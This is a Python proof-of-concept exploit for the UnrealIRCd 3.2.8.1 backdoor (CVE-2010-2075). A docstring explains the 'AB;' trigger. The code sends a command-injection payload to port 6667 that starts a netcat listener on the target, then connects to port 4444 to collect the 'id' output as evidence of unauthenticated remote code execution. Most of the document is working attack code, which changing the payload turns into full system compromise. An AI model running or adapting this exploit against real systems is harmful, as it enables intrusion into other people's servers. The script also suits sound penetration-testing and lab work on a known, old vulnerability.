"""
ATTACK NAME: UnrealIRCd 3.2.8.1 Backdoor
PORT: 6667
CVE: CVE-2010-2075

VULNERABILITY: In 2009, the official UnrealIRCd mirror was compromised. 
A malicious actor modified the DEBUG3_DOLOG_SYSTEM macro in the C source code.
If a client sends a string beginning with 'AB;', the server passes the remainder 
of the string directly to the system() execution function.

HOW IT WORKS:
1. Connect to the IRC port (6667).
2. The server sends initial 'NOTICE' banners.
3. Send the magic bytes: 'AB;' followed by an Out-Of-Band command (e.g., pipe to netcat).
4. The server executes it blindly in the background. It DOES NOT return stdout to the IRC socket.
5. We catch the output via our secondary listener.

SECURITY IMPACT: Critical. Unauthenticated Remote Code Execution (RCE).
"""

import socket
import re
import time

TARGET_IP = "victim"

# The "Safe" Validation Payload:
# We tell the server to run 'id', and pipe the output to a temporary netcat listener on port 4444.
# We use 'nohup' and '&' so the IRC server doesn't freeze waiting for us to connect.
TRIGGER_PAYLOAD = "AB; nohup sh -c 'id | nc -l -p 4444' &\n"

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 6667 (UnrealIRCd)...")

    # --- STEP 1: FIRE THE BLIND TRIGGER ---
    try:
        with socket.create_connection((TARGET_IP, 6667), timeout=5) as s:
            time.sleep(1) # Wait for IRC banner
            print("[*] Sending 'AB;' trigger with Out-Of-Band listener...")
            s.sendall(TRIGGER_PAYLOAD.encode())
            time.sleep(1) # Give the OS a second to spin up port 4444
    except Exception as e:
        print(f"[!] Trigger Execution Failed: {e}")
        return

    # --- STEP 2: HARVEST THE EVIDENCE ---
    print("[*] Connecting to secondary port (4444) to harvest evidence...")
    raw_response = ""
    try:
        with socket.create_connection((TARGET_IP, 4444), timeout=5) as s:
            raw_response = s.recv(1024).decode(errors='ignore')
            print(f"[+] Evidence Harvested:\n{raw_response.strip()}")
    except Exception as e:
        print(f"[!] Harvesting Failed. Exploit didn't execute or netcat is blocked: {e}")
        return

    # --- STEP 3: VALIDATE ---
    print("[*] Running Validator...")
    if re.search(r"uid=\d+", raw_response):
        print("✅ VERDICT: VULNERABILITY CONFIRMED. Blind RCE successful.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED.")

if __name__ == "__main__":
    run_test()